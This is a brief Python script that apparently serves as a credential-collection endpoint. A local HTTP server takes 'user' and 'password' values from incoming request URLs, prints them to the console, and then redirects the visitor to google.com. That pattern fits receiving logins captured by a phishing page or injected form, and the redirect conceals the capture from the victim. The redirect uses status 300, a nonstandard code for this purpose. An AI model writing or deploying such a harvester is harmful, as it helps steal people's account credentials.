from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse,parse_qs

hostName = "localhost"
serverPort = 8443

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        queries = parse_qs(urlparse(self.path).query)
        print("Username: %s, Password: %s"%(queries["user"][0],queries["password"][0]))
        self.send_response(300)
        self.send_header("Location", "http://www.google.com")
        self.end_headers()

if __name__ == "__main__":        
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://%s:%s" % (hostName, serverPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")